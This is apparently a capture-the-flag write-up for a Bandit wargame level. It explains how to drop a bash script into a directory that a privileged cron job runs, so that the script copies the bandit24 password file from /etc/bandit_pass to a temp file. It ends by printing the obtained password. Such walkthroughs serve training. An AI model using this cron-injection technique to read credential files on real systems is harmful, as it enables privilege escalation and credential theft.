- This level requires us to write a shell script of our own to get the password
- A cron job is running periodically with the privilege level of ```bandit24```, and the script basically runs all the scripts inside a specified directory wherein we can write our shell script
- Since this will be executed with the privilege level of ```bandit24```, we can also read the password of that user
- For this purpose we write our own script that looks like this:
```bash
#!/bin/bash
mytarget=$(echo "Hello bandit24" | md5sum | cut -d " " -f 1)
cat /etc/bandit_pass/bandit24 > /tmp/tmp.RqasELVdyi/$mytarget
```
- Now we just copy this script in the directory specified in the cron job, and wait for a minute to get the password
- Obtained password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8